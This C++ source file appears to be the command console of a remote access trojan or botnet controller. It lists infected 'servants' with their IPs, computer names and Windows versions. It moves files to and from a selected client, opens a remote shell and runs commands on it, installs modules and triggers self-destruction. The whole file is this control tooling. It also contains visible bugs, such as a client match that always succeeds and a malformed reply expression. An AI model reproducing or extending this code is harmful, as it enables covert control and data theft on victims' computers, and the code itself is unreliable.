#include "stdafx.h"
#include "..\master\masterInclude.h"
#include "CommandManager.h"
#include "Commands.h"

#define CHECK_SELECTED_CLIENTID(__clientid)	\
	tstring __clientid = env.GetClientid();				\
	if (__clientid.size() == 0)							\
	{													\
		replyText = _T("请先用select选择一个客户端");	\
		return FALSE;									\
	}

BOOL ClientsCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env ) 
{
	MyStringList clientidList;
	ListAvailableClients(&clientidList);

	replyText += _T("----------servants----------\r\n");
	for (DWORD i = 0; i < clientidList.Count(); i++)
	{
		replyText += clientidList.At(i);
		replyText += _T("\r\n");
	}
	
	return TRUE;
}

static LPCSTR Ipstr(ULONG ip)
{
	IN_ADDR addr;
	addr.S_un.S_addr = ip;
	return inet_ntoa(addr);
}

BOOL ClientinfoCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	ClientInfoList infoList;
	CommandManager::GetInstanceRef().ListClientInfo(infoList);

	tostringstream toss;
	for (DWORD i = 0; i < infoList.size(); i++)
	{
		CLIENT_INFO& info = infoList[i];

		toss << info.clientid << '\t' << Ipstr(info.connectIP) << '\t' << info.computerName << '\t';
		toss << info.windowsVersion << ' ' << info.bX64 << '\t' << info.localIPCount;
		toss << _T("\r\n\t") << info.mods << _T("\r\n");
	}

	replyText = toss.str();

	return TRUE;
}

BOOL SelectCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env ) 
{
 	if (parts.size() == 1)
 	{
 		tstring selectedClientid = env.GetClientid();
 		replyText = _T("selected clientid : ");
 		replyText += selectedClientid;
 
 		return TRUE;
 	}
 	else
 	{
		tstring selected;
		MyStringList clientidList;
		ListAvailableClients(&clientidList);

		for (DWORD i = 0; i < clientidList.Count(); i++)
		{
			tstring clientid = clientidList.At(i);

 			if (clientid.find(parts[1].c_str()) >= 0)
 			{
 				selected = clientid;
 				break;
 			}
 		}
 
 		if (selected.size() > 0)
 		{
 			env.SetClientid(selected.c_str());
 			replyText = selected.c_str();
 			replyText += _T(" has been selected");
 			return TRUE;
 		}
 		else
 		{
 			replyText = _T("no such available clientid : ");
 			replyText += parts[1].c_str();
 			return FALSE;
 		}
 	}
}

BOOL DownloadCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	if (parts.size() != 3)
	{
		replyText = _T("使用方法：download localfile targetFilename");
		return FALSE;
	}

	CHECK_SELECTED_CLIENTID(clientid);

	MSGSERIALID serialid;
	BOOL bRet = MakeClientDownloadFile(clientid.c_str(), parts[1].c_str(), parts[2].c_str(), &serialid);
	if (bRet)
	{
		replyText = _T("send OK");
	}
	else
	{
		replyText = _T("send Failed");
	}

	return bRet;
}

BOOL UploadCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	if (parts.size() != 3)
	{
		replyText = _T("使用方法：upload remotefile localFilename");
		return FALSE;
	}

	CHECK_SELECTED_CLIENTID(clientid);

	MSGSERIALID serialid;
	BOOL bRet = MakeClientUploadFile(clientid.c_str(), parts[1].c_str(), parts[2].c_str(), &serialid);
	if (bRet)
	{
		replyText = _T("send OK");
	}
	else
	{
		replyText = _T("send Failed");
	}

	return bRet;
}

BOOL ListmodCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	CHECK_SELECTED_CLIENTID(clientid);

	MyStringList modnameList;
	if (! ListModules(clientid.c_str(), &modnameList))
	{
		replyText = _T("错误:");
		replyText += GetMasterErrorMsg(GetMasterLastError());
		return FALSE;
	}

	tostringstream toss;
	toss << _T("可用模块：\r\n");
	for (DWORD i = 0; i < modnameList.Count(); i++)
	{
		toss << _T("\t") << (LPCTSTR)modnameList.At(i) << _T("\r\n");
	}

	replyText = toss.str();

	return TRUE;
}

void RemoteCmdOutput(LPCSTR output, LPVOID lpParameter)
{
	printf(output);
}

BOOL OpenshellCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	CHECK_SELECTED_CLIENTID(clientid);
	BOOL bRet = OpenShell(clientid.c_str(), RemoteCmdOutput, NULL);
	if (bRet)
	{
		replyText = _T("open shell SUCCESS");
		return TRUE;
	}
	else
	{
		replyText = _T("open shell FAILED!");
		return FALSE;
	}
}

BOOL CloseshellCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	CHECK_SELECTED_CLIENTID(clientid);
	CloseShell(clientid.c_str());
	return TRUE;
}

BOOL ExecuteShellCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	CHECK_SELECTED_CLIENTID(clientid);

	tostringstream toss;
	for (int i = 1; i < parts.size(); i++)
	{
		toss << parts[i] << ' ';
	}
	tstring cmdline = toss.str();
	trim(cmdline, ' ');
	
	return ExecuteShellCommand(clientid.c_str(), cmdline.c_str());
}

BOOL InstallMod::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	CHECK_SELECTED_CLIENTID(clientid);

	if (parts.size() != 2)
	{
		replyText = _T("Usage: install modname");
		return FALSE;
	}

	tstring modname = parts[1];
	trim(modname);
	makeLower(modname);

	BOOL bInstOK = InstallClientModule(clientid.c_str(), modname.c_str());

	tostringstream toss;
	toss << _T("install mod ") << modname << _T(" ") << bInstOK ? _T("OK") : _T("Failed");
	replyText = toss.str();

	return TRUE;
}

BOOL AllModCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	MyStringList myNameList;
	ListAvailableClientModules(&myNameList);

	tostringstream toss;
	for (int i = 0; i < myNameList.Count(); i++)
	{
		toss << (LPCTSTR)myNameList.At(i) << ',';
	}

	replyText = toss.str();

	return TRUE;
}

BOOL SDCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv& env )
{
	CHECK_SELECTED_CLIENTID(clientid);

	BOOL bSendOK = MakeClientSelfDestruction(clientid.c_str());

	tostringstream toss;
	toss << _T("send SelfDestruction command ") << (bSendOK ? _T("Success") : _T("Failed"));

	return TRUE;
}
